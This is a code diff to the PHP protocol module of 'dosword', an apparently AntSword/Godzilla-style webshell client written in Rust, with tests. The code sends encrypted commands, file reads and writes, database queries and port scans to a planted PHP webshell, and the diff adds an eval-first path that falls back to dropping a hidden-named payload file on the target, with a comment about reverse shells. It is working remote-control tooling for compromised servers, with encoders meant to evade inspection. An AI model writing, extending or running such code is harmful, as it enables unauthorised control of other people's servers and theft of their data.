@@ -11,24 +11,21 @@
 //! 本协议只生成白名单模板，不提供任意 PHP 代码透传入口。
 
 use std::any::Any;
-use std::collections::VecDeque;
-use std::sync::atomic::{AtomicU64, Ordering};
-use std::sync::{LazyLock, Mutex};
 use std::time::Instant;
 
-use base64::engine::general_purpose::STANDARD as B64;
 use base64::Engine;
+use base64::engine::general_purpose::STANDARD as B64;
 use serde_json::Value;
 
 use dosword_sdk::domain::{
     AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing, FileEntry,
-    ProbeResult, RequestRecord, ShellProfile,
+    ProbeResult, ShellProfile,
 };
 
-use super::transport::build_client;
-use dosword_sdk::encoder::{EncoderRegistry, NativeEncoder, PayloadEncoder};
+use super::transport::{build_client, form_escape, json_str};
+use dosword_sdk::encoder::{EncoderRegistry, PayloadEncoder};
 use dosword_sdk::{PluginKind, PluginManifest, ProtocolPlugin};
-use dosword_sdk::{FeaturePlugin, Protocol, ProtocolError, SessionState};
+use dosword_sdk::{Protocol, ProtocolError, SessionState};
 
 pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";
 
@@ -52,9 +49,15 @@ fn session_enabled(protocol_params: &str) -> bool {
 fn encoder_for(protocol_params: &str) -> &'static dyn PayloadEncoder {
     let encoder_id: Option<String> = serde_json::from_str::<serde_json::Value>(protocol_params)
         .ok()
-        .and_then(|value| value.get("encoder").and_then(|item| item.as_str().map(str::to_string)));
+        .and_then(|value| {
+            value
+                .get("encoder")
+                .and_then(|item| item.as_str().map(str::to_string))
+        });
     match encoder_id.as_deref() {
-        Some(id) => EncoderRegistry::global().get(id).unwrap_or(&dosword_sdk::encoder::NATIVE_XOR),
+        Some(id) => EncoderRegistry::global()
+            .get(id)
+            .unwrap_or(&dosword_sdk::encoder::NATIVE_XOR),
         None => &dosword_sdk::encoder::NATIVE_XOR,
     }
 }
@@ -66,7 +69,8 @@ impl ProtocolPlugin for PhpProtocol {
             name: self.display_name().to_string(),
             version: env!("CARGO_PKG_VERSION").to_string(),
             kind: PluginKind::Protocol,
-            description: "标准 PHP WebShell（类蚁剑）：命令执行、文件管理、数据库操作。".to_string(),
+            description: "标准 PHP WebShell（类蚁剑）：命令执行、文件管理、数据库操作。"
+                .to_string(),
             capabilities: vec![
                 "files".to_string(),
                 "terminal".to_string(),
@@ -127,7 +131,8 @@ const TEMPLATE_PREFIX: &str = r#"@ini_set("display_errors","0");@error_reporting
 const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;
 
 /// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
-const TEMPLATE_FRAME_DIE: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;
+const TEMPLATE_FRAME_DIE: &str =
+    r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;
 
 /// 数据库驱动白名单（Rust 侧校验，防止任意 DSN 注入）。
 const DB_DRIVERS: [&str; 6] = ["mysql", "pgsql", "sqlite", "mssql", "oracle", "redis"];
@@ -161,82 +166,9 @@ $__r=array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0
 echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;
 
 // ---------------------------------------------------------------------------
-// 请求调试：进程内环缓冲，记录每条协议帧（载荷 / 响应），供「请求调试」页查看。
-// 仅调试用途，不落盘；密码在载荷预览中脱敏。
+// 请求调试：统一走 protocol::reqlog（环缓冲，密码脱敏，记录全部协议帧）。
+// PHP 协议在此登记为 builtin.php.v1；JSP/ASP/Python/Node 在 jsp.rs 登记。
 // ---------------------------------------------------------------------------
-
-/// 载荷 / 响应预览截断长度。
-const DEBUG_PREVIEW_LEN: usize = 2048;
-/// 环缓冲容量。
-const DEBUG_LOG_CAP: usize = 200;
-
-static REQUEST_LOG: LazyLock<Mutex<VecDeque<RequestRecord>>> =
-    LazyLock::new(|| Mutex::new(VecDeque::with_capacity(DEBUG_LOG_CAP)));
-static REQUEST_COUNTER: AtomicU64 = AtomicU64::new(0);
-
-/// 记录一条协议请求（由 send_frame 调用）。
-fn record_request(
-    action: &str,
-    endpoint: &str,
-    status: u16,
-    duration_ms: u64,
-    code: &str,
-    response: &str,
-    password: &str,
-) {
-    // 载荷脱敏：密码字面量替换为 ***（密码为空时跳过，避免 replace("") 异常）
-    let payload = if password.is_empty() {
-        code.to_string()
-    } else {
-        code.replace(password, "***")
-    };
-    let mut record = RequestRecord {
-        id: REQUEST_COUNTER.fetch_add(1, Ordering::Relaxed),
-        endpoint: endpoint.to_string(),
-        action: action.to_string(),
-        created_at: chrono::Utc::now().to_rfc3339(),
-        status,
-        duration_ms,
-        payload: truncate(&payload),
-        response: truncate(response),
-    };
-    // 响应里可能残留明文密码（如 AUTH_FAIL 回显外的场景），一并脱敏
-    record.response = if password.is_empty() {
-        record.response
-    } else {
-        record.response.replace(password, "***")
-    };
-    let mut log = REQUEST_LOG.lock().expect("请求日志锁异常");
-    if log.len() >= DEBUG_LOG_CAP {
-        log.pop_front();
-    }
-    log.push_back(record);
-}
-
-fn truncate(value: &str) -> String {
-    let mut chars = value.chars();
-    let head: String = chars.by_ref().take(DEBUG_PREVIEW_LEN).collect();
-    if chars.next().is_some() {
-        format!("{head}\n…（已截断）")
-    } else {
-        head
-    }
-}
-
-/// 列出请求记录（可选按端点过滤），新记录在前。
-pub fn list_requests(endpoint: Option<&str>) -> Vec<RequestRecord> {
-    let log = REQUEST_LOG.lock().expect("请求日志锁异常");
-    log.iter()
-        .rev()
-        .filter(|record| endpoint.map_or(true, |target| record.endpoint == target))
-        .cloned()
-        .collect()
-}
-
-/// 清空请求记录。
-pub fn clear_requests() {
-    REQUEST_LOG.lock().expect("请求日志锁异常").clear();
-}
 
 impl PhpProtocol {
     // --- Godzilla 分阶段载荷操作（xor_session） ---
@@ -340,7 +272,11 @@ impl PhpProtocol {
         let extensions = value
             .pointer("/data/extensions")
             .and_then(|v| v.as_array())
-            .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
+            .map(|a| {
+                a.iter()
+                    .filter_map(|v| v.as_str().map(String::from))
+                    .collect()
+            })
             .unwrap_or_default();
         let disable_functions = value
             .pointer("/data/disable_functions")
@@ -445,9 +381,20 @@ impl PhpProtocol {
                 array
                     .iter()
                     .map(|item| FileEntry {
-                        name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
-                        path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
-                        is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
+                        name: item
+                            .get("name")
+                            .and_then(|v| v.as_str())
+                            .unwrap_or("")
+                            .to_string(),
+                        path: item
+                            .get("path")
+                            .and_then(|v| v.as_str())
+                            .unwrap_or("")
+                            .to_string(),
+                        is_dir: item
+                            .get("is_dir")
+                            .and_then(|v| v.as_bool())
+                            .unwrap_or(false),
                         size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                         modified: item
                             .get("mtime")
@@ -534,7 +481,12 @@ impl PhpProtocol {
         timestamp: u64,
         settings: &AppSettings,
     ) -> Result<(), ProtocolError> {
-        dispatch(php, "touch", &[("p", path), ("t", &timestamp.to_string())], settings)?;
+        dispatch(
+            php,
+            "touch",
+            &[("p", path), ("t", &timestamp.to_string())],
+            settings,
+        )?;
         Ok(())
     }
 
@@ -641,7 +593,7 @@ impl PhpProtocol {
         let (key_param, _) = encoder.form_params();
         Self::build_code(
             TEMPLATE_PREFIX,
-            &[("PARAM_K", key_param), ("PWD", password)],
+            &[("PARAM_K", key_param), ("PWD", &crate::protocol::transport::php_single_quote(password))],
         )
     }
 
@@ -672,10 +624,12 @@ impl PhpProtocol {
             encoder.encode(&code, password)
         } else {
             let (key_param, data_param) = encoder.form_params();
-            url::form_urlencoded::Serializer::new(String::new())
-                .append_pair(key_param, password)
-                .append_pair(data_param, &encoder.encode(&code, password))
-                .finish()
+            let payload = encoder.encode(&code, password);
+            format!(
+                "{key_param}={}&{data_param}={}",
+                form_escape(password),
+                form_escape(&payload)
+            )
         };
 
         let response = client
@@ -695,10 +649,9 @@ impl PhpProtocol {
             ));
         }
 
-        let bytes = response
-            .bytes()
-            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
         let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
+        let bytes = crate::protocol::transport::read_limited(response, max_bytes)
+            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
         if bytes.len() > max_bytes as usize {
             return Err(ProtocolError::ParseError(format!(
                 "响应超过大小上限（{}MB）",
@@ -707,8 +660,9 @@ impl PhpProtocol {
         }
         let text = String::from_utf8_lossy(&bytes);
 
-        // 调试记录（先于错误分支，失败请求同样留痕）
-        record_request(
+        // 调试记录（先于错误分支，失败请求同样留痕）——统一 reqlog 模块
+        crate::protocol::reqlog::record_request(
+            PHP_PROTOCOL_ID,
             action,
             endpoint,
             status.as_u16(),
@@ -774,7 +728,12 @@ fn random_nonce() -> String {
 fn format_timestamp(ts: i64) -> String {
     use chrono::{DateTime, Local};
     DateTime::from_timestamp(ts, 0)
-        .map(|datetime| datetime.with_timezone(&Local).format("%Y-%m-%d %H:%M").to_string())
+        .map(|datetime| {
+            datetime
+                .with_timezone(&Local)
+                .format("%Y-%m-%d %H:%M")
+                .to_string()
+        })
         .unwrap_or_default()
 }
 
@@ -819,29 +778,39 @@ impl Protocol for PhpProtocol {
                 code.len()
             )));
         }
-        // 1) 获取目标当前目录（写临时载荷用）
+        // 1) S2：优先 eval 通道（单次往返、无临时文件落地）
+        //    载荷剥离 <?php 后直接经 dispatch eval 执行（eval_fn try/catch 包裹）。
+        //    失败（代码致命错误/目标不支持 eval）时降级临时文件通道。
+        let script = code
+            .trim_start()
+            .strip_prefix("<?php")
+            .map(str::trim_start)
+            .unwrap_or(code);
+        match dispatch(php, "eval", &[("c", script)], settings) {
+            Ok(value) => {
+                let text = value
+                    .pointer("/data")
+                    .and_then(|v| v.as_str())
+                    .unwrap_or("")
+                    .to_string();
+                return Ok(text);
+            }
+            Err(_) => {
+                // 降级：临时文件通道（目标 eval 不可用或载荷依赖独立请求环境）
+            }
+        }
+        // 2) 降级通道：获取目标当前目录 + 随机文件名 + 写入载荷
         let cwd = self
             .execute_command(session, "pwd 2>/dev/null", settings)?
             .stdout
             .trim()
             .to_string();
         if cwd.is_empty() {
-            // 命令函数被 disable_functions 全禁（exec 通道不可用）：
-            // 降级 eval 通道直接执行载荷（插件代码不依赖临时文件）
-            let script = code
-                .trim_start()
-                .strip_prefix("<?php")
-                .map(str::trim_start)
-                .unwrap_or(code);
-            let value = dispatch(php, "eval", &[("c", script)], settings)?;
-            let text = value
-                .pointer("/data")
-                .and_then(|v| v.as_str())
-                .unwrap_or("")
-                .to_string();
-            return Ok(text);
+            return Err(ProtocolError::ServerError(
+                "run_code 降级通道失败：无法获取目标当前目录（命令通道不可用且 eval 失败）"
+                    .to_string(),
+            ));
         }
-        // 2) 随机文件名 + 写入载荷
         // 注意：点开头文件在部分 PHP 内置服务器下行为异常（反弹 shell 无输出），
         // 使用下划线前缀（仍为随机难猜，且兼容隐藏意图）
         let name = format!("_dsw_{:x}.php", uuid::Uuid::new_v4().simple());
@@ -928,7 +897,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME
         );
         let start = Instant::now();
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "exec", php.encoder)?;
+        let value = self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "exec",
+            php.encoder,
+        )?;
         let duration_ms = start.elapsed().as_millis() as u64;
 
         let stdout = value
@@ -942,7 +919,11 @@ impl Protocol for PhpProtocol {
             .and_then(|v| v.as_str())
             .map(str::to_string);
 
-        Ok(CommandOutput { stdout, duration_ms, cwd })
+        Ok(CommandOutput {
+            stdout,
+            duration_ms,
+            cwd,
+        })
     }
 
     fn list_dir(
@@ -965,7 +946,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "list_dir", php.encoder)?;
+        let value = self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "list_dir",
+            php.encoder,
+        )?;
 
         let entries: Vec<FileEntry> = value
             .pointer("/data/entries")
@@ -974,9 +963,20 @@ impl Protocol for PhpProtocol {
                 array
                     .iter()
                     .map(|item| FileEntry {
-                        name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
-                        path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
-                        is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
+                        name: item
+                            .get("name")
+                            .and_then(|v| v.as_str())
+                            .unwrap_or("")
+                            .to_string(),
+                        path: item
+                            .get("path")
+                            .and_then(|v| v.as_str())
+                            .unwrap_or("")
+                            .to_string(),
+                        is_dir: item
+                            .get("is_dir")
+                            .and_then(|v| v.as_bool())
+                            .unwrap_or(false),
                         size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                         modified: item
                             .get("mtime")
@@ -1016,7 +1016,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_file", php.encoder)?;
+        let value = self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "read_file",
+            php.encoder,
+        )?;
 
         value
             .get("data")
@@ -1047,7 +1055,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_file", php.encoder)?;
+        self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "write_file",
+            php.encoder,
+        )?;
         Ok(())
     }
 
@@ -1071,7 +1087,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "delete", php.encoder)?;
+        self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "delete",
+            php.encoder,
+        )?;
         Ok(())
     }
 
@@ -1097,7 +1121,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "rename", php.encoder)?;
+        self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "rename",
+            php.encoder,
+        )?;
         Ok(())
     }
 
@@ -1121,7 +1153,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "mkdir", php.encoder)?;
+        self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "mkdir",
+            php.encoder,
+        )?;
         Ok(())
     }
 
@@ -1147,7 +1187,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "touch", php.encoder)?;
+        self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "touch",
+            php.encoder,
+        )?;
         Ok(())
     }
 
@@ -1172,7 +1220,15 @@ impl Protocol for PhpProtocol {
             off = offset,
             len = length,
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_chunk", php.encoder)?;
+        let value = self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "read_chunk",
+            php.encoder,
+        )?;
         value
             .get("data")
             .and_then(|v| v.as_str())
@@ -1202,7 +1258,15 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME,
             off = offset,
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_chunk", php.encoder)?;
+        self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "write_chunk",
+            php.encoder,
+        )?;
         Ok(())
     }
 
@@ -1230,7 +1294,7 @@ impl Protocol for PhpProtocol {
             DB_PROBE_CODE,
             &[
                 ("PARAM_K", encoder_form_key(php.encoder)),
-                ("PWD", &php.password),
+                ("PWD", &crate::protocol::transport::php_single_quote(&php.password)),
                 ("DSN", &B64.encode(dsn.as_bytes())),
                 ("USER", &B64.encode(conn_user(connection))),
                 ("PASS", &B64.encode(conn_pass(connection))),
@@ -1239,7 +1303,15 @@ impl Protocol for PhpProtocol {
                 ("DRIVER", &driver),
             ],
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_probe", php.encoder)?;
+        let value = self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "db_probe",
+            php.encoder,
+        )?;
         let databases = value
             .pointer("/data/databases")
             .and_then(|v| v.as_array())
@@ -1276,7 +1348,7 @@ impl Protocol for PhpProtocol {
             DB_QUERY_CODE,
             &[
                 ("PARAM_K", encoder_form_key(php.encoder)),
-                ("PWD", &php.password),
+                ("PWD", &crate::protocol::transport::php_single_quote(&php.password)),
                 ("DSN", &B64.encode(dsn.as_bytes())),
                 ("USER", &B64.encode(conn_user(connection))),
                 ("PASS", &B64.encode(conn_pass(connection))),
@@ -1284,7 +1356,15 @@ impl Protocol for PhpProtocol {
             ],
         );
         let start = Instant::now();
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_query", php.encoder)?;
+        let value = self.send_frame(
+            &php.client,
+            &php.endpoint,
+            &php.password,
+            &code,
+            settings,
+            "db_query",
+            php.encoder,
+        )?;
         let duration_ms = start.elapsed().as_millis() as u64;
 
         let columns = value
@@ -1353,7 +1433,11 @@ fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, Protocol
     }
     let host = connection.host.as_deref().unwrap_or("");
     let port = connection.port.unwrap_or_else(|| {
-        if connection.driver == "pgsql" { 5432 } else { 3306 }
+        if connection.driver == "pgsql" {
+            5432
+        } else {
+            3306
+        }
     });
     let dbname = connection.dbname.as_deref().unwrap_or("");
     match connection.driver.as_str() {
@@ -1373,7 +1457,11 @@ fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, Protocol
             Ok(dsn)
         }
         _ => {
-            let db = if dbname.is_empty() { "postgres" } else { dbname };
+            let db = if dbname.is_empty() {
+                "postgres"
+            } else {
+                dbname
+            };
             Ok(format!("pgsql:host={host};port={port};dbname={db}"))
         }
     }
@@ -1396,30 +1484,10 @@ fn info_map(value: &serde_json::Value) -> std::collections::HashMap<String, Stri
         .and_then(|v| v.as_object())
         .map(|obj| {
             obj.iter()
-                .filter_map(|(k, v)| {
-                    v.as_str().map(|s| (k.clone(), s.to_string()))
-                })
+                .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                 .collect()
         })
         .unwrap_or_default()
-}
-
-fn json_str(value: &str) -> String {
-    let mut out = String::with_capacity(value.len());
-    for ch in value.chars() {
-        match ch {
-            '\\' => out.push_str("\\\\"),
-            '"' => out.push_str("\\\""),
-            '\n' => out.push_str("\\n"),
-            '\r' => out.push_str("\\r"),
-            '\t' => out.push_str("\\t"),
-            '\u{08}' => out.push_str("\\b"),
-            '\u{0C}' => out.push_str("\\f"),
-            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
-            c => out.push(c),
-        }
-    }
-    out
 }
 
 /// 发送一次 body 直传请求（密文），返回 XOR 解密后的明文响应。
@@ -1438,7 +1506,11 @@ fn session_post(
     if !response.status().is_success() {
         return Err(ProtocolError::HttpStatus(
             response.status().as_u16(),
-            response.status().canonical_reason().unwrap_or("").to_string(),
+            response
+                .status()
+                .canonical_reason()
+                .unwrap_or("")
+                .to_string(),
         ));
     }
     let bytes = response
@@ -1501,13 +1573,13 @@ fn session_call(
     let text = String::from_utf8_lossy(&plain);
 
     // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
-    let start = text.find(&nonce).ok_or_else(|| {
-        ProtocolError::ParseError(format!("响应中未找到协议帧（{text}）"))
-    })?;
+    let start = text
+        .find(&nonce)
+        .ok_or_else(|| ProtocolError::ParseError(format!("响应中未找到协议帧（{text}）")))?;
     let tail = &text[start + nonce.len()..];
-    let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
-        "协议帧不完整".to_string(),
-    ))?;
+    let end = tail
+        .find(&nonce)
+        .ok_or(ProtocolError::ParseError("协议帧不完整".to_string()))?;
     let payload_b64 = &tail[..end];
     let decoded = B64
         .decode(payload_b64)
@@ -1539,10 +1611,9 @@ fn native_call(
     request.push('}');
 
     let payload = php.encoder.encode(&request, &php.password);
-    // base64 载荷可能含 +/=，必须 URL 编码（否则 PHP 表单解析时 + 转空格损坏密文）
-    let body = url::form_urlencoded::Serializer::new(String::new())
-        .append_pair("formData", &payload)
-        .finish();
+    // base64 载荷可能含 +/=，必须转义（否则 PHP 表单解析时 + 转空格损坏密文）；
+    // P2：手动快速转义（仅 +、=、&），避免对整块载荷全量百分号编码
+    let body = format!("formData={}", form_escape(&payload));
     let token = &dosword_sdk::encoder::md5_hex(&php.password)[..16];
     let response = php
         .client
@@ -1555,13 +1626,16 @@ fn native_call(
     if !response.status().is_success() {
         return Err(ProtocolError::HttpStatus(
             response.status().as_u16(),
-            response.status().canonical_reason().unwrap_or("").to_string(),
+            response
+                .status()
+                .canonical_reason()
+                .unwrap_or("")
+                .to_string(),
         ));
     }
-    let bytes = response
-        .bytes()
-        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
     let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
+    let bytes = crate::protocol::transport::read_limited(response, max_bytes)
+        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
     if bytes.len() > max_bytes as usize {
         return Err(ProtocolError::ParseError(format!(
             "响应超过大小上限（{}MB）",
@@ -1611,7 +1685,8 @@ fn conn_json(connection: &DbConnection) -> String {
     serde_json::to_string(connection).unwrap_or_else(|_| "{}".to_string())
 }
 
-fn conn_user(connection: &DbConnection) -> String {    connection.username.as_deref().unwrap_or("").to_string()
+fn conn_user(connection: &DbConnection) -> String {
+    connection.username.as_deref().unwrap_or("").to_string()
 }
 
 fn conn_pass(connection: &DbConnection) -> String {
@@ -1634,8 +1709,9 @@ mod tests {
     use serde_json::json;
 
     use super::*;
-    use dosword_sdk::encoder::md5_hex;
+    use dosword_sdk::FeaturePlugin;
     use dosword_sdk::domain::ShellProfile;
+    use dosword_sdk::encoder::md5_hex;
 
     fn settings() -> AppSettings {
         AppSettings {
@@ -1643,8 +1719,9 @@ mod tests {
             default_timeout_secs: 5,
             proxy: None,
             max_file_size_mb: 32,
-        chunk_size_mb: 4,
-        allow_arbitrary_code: true,
+            chunk_size_mb: 4,
+            allow_arbitrary_code: true,
+            audit_retention_days: 90,
         }
     }
 
@@ -1693,7 +1770,10 @@ mod tests {
                     }
                 }
                 let request = String::from_utf8_lossy(&buf);
-                let body_start = request.find("\r\n\r\n").map(|i| i + 4).unwrap_or(request.len());
+                let body_start = request
+                    .find("\r\n\r\n")
+                    .map(|i| i + 4)
+                    .unwrap_or(request.len());
                 let body = &request[body_start.min(request.len())..];
 
                 let params: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
@@ -1806,12 +1886,17 @@ mod tests {
     fn real_php_all_encoders_round_trip() {
         // 每个编码器的生成 stub 都做真实执行验证（防止模板双重调用等 bug 漏网）
         let encoders = [
-            "native", "native_aes_ecb", "native_aes_cbc", "native_des",
-            "native_chacha20", "native_rabbit",
+            "native",
+            "native_aes_ecb",
+            "native_aes_cbc",
+            "native_des",
+            "native_chacha20",
+            "native_rabbit",
         ];
         let settings = settings();
         for encoder_id in encoders {
-            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false) else {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
+            else {
                 eprintln!("跳过 {encoder_id}：未检测到 php 可执行文件");
                 continue;
             };
@@ -1819,7 +1904,8 @@ mod tests {
             profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
             let result = (|| -> Result<String, ProtocolError> {
                 let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-                let output = PhpProtocol.execute_command(session.as_ref(), "printf enc-ok", &settings)?;
+                let output =
+                    PhpProtocol.execute_command(session.as_ref(), "printf enc-ok", &settings)?;
                 Ok(output.stdout)
             })();
             let _ = child.kill();
@@ -1840,12 +1926,17 @@ mod tests {
     fn real_php_session_variants_round_trip() {
         // Godzilla 分阶段载荷应用到所有编码器：每个编码器以 session 模式真实往返
         let encoders = [
-            "native", "native_aes_ecb", "native_aes_cbc", "native_des",
-            "native_chacha20", "native_rabbit",
+            "native",
+            "native_aes_ecb",
+            "native_aes_cbc",
+            "native_des",
+            "native_chacha20",
+            "native_rabbit",
         ];
         let settings = settings();
         for encoder_id in encoders {
-            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", true) else {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", true)
+            else {
                 eprintln!("跳过 {encoder_id} session：未检测到 php");
                 continue;
             };
@@ -1858,13 +1949,15 @@ mod tests {
             }
             let result = (|| -> Result<String, ProtocolError> {
                 let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-                let output = PhpProtocol.execute_command(session.as_ref(), "printf sess-ok", &settings)?;
+                let output =
+                    PhpProtocol.execute_command(session.as_ref(), "printf sess-ok", &settings)?;
                 Ok(output.stdout)
             })();
             let _ = child.kill();
             let _ = child.wait();
             let _ = std::fs::remove_dir_all(&dir);
-            let stdout = result.unwrap_or_else(|error| panic!("{encoder_id} session 真实执行应成功：{error}"));
+            let stdout = result
+                .unwrap_or_else(|error| panic!("{encoder_id} session 真实执行应成功：{error}"));
             assert_eq!(stdout.trim(), "sess-ok", "{encoder_id} session 输出不符");
         }
     }
@@ -1881,14 +1974,28 @@ mod tests {
         profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             // 通用：进程详情（结构化表格）
-            let out = dosword_sdk::feature_plugins::ProcessesPlugin
-                .execute(&protocol, php, "php", &serde_json::json!({}), &settings)?;
+            let out = dosword_sdk::feature_plugins::ProcessesPlugin.execute(
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({}),
+                &settings,
+            )?;
             let rows = out["data"]["rows"].as_array().map(|a| a.len()).unwrap_or(0);
             assert!(rows > 0, "进程行不应为空：{out:?}");
-            assert_eq!(out["data"]["columns"].as_array().map(|a| a.len()).unwrap_or(0), 6);
+            assert_eq!(
+                out["data"]["columns"]
+                    .as_array()
+                    .map(|a| a.len())
+                    .unwrap_or(0),
+                6
+            );
             eprintln!("[plugin] processes 结构化 {rows} 行");
             // 通用：端口扫描（代码通道，扫本机开放端口）
             let scan = dosword_sdk::feature_plugins::PortScanPlugin.execute(
@@ -1901,10 +2008,18 @@ mod tests {
             let open = scan["open"].as_array().map(|a| a.len()).unwrap_or(0);
             eprintln!("[plugin] port_scan open={open}");
             // PHP 专用：环境检测
-            let env = dosword_sdk::feature_plugins::PhpEnvPlugin
-                .execute(&protocol, php, "php", &serde_json::json!({}), &settings)?;
+            let env = dosword_sdk::feature_plugins::PhpEnvPlugin.execute(
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({}),
+                &settings,
+            )?;
             assert!(env["php_version"].as_str().is_some(), "应返回 php_version");
-            eprintln!("[plugin] php_env {}", env["php_version"].as_str().unwrap_or(""));
+            eprintln!(
+                "[plugin] php_env {}",
+                env["php_version"].as_str().unwrap_or("")
+            );
             Ok(())
         })();
         let _ = child.kill();
@@ -1940,13 +2055,25 @@ mod tests {
         }"#;
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let plugin = dosword_sdk::ScriptFeaturePlugin::from_json(plugin_json)
                 .map_err(|e| ProtocolError::ParseError(e))?;
-            let out = plugin.execute(&PhpProtocol, php, "php", &serde_json::json!({"mark": "from-test"}), &settings)?;
+            let out = plugin.execute(
+                &PhpProtocol,
+                php,
+                "php",
+                &serde_json::json!({"mark": "from-test"}),
+                &settings,
+            )?;
             assert_eq!(out["mark"].as_str(), Some("from-test"), "参数应注入模板");
             assert!(out["php"].as_str().is_some(), "应返回 PHP 版本");
-            eprintln!("[plugin] script 插件执行 {}", out["php"].as_str().unwrap_or(""));
+            eprintln!(
+                "[plugin] script 插件执行 {}",
+                out["php"].as_str().unwrap_or("")
+            );
             Ok(())
         })();
         let _ = child.kill();
@@ -1967,13 +2094,21 @@ mod tests {
         profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
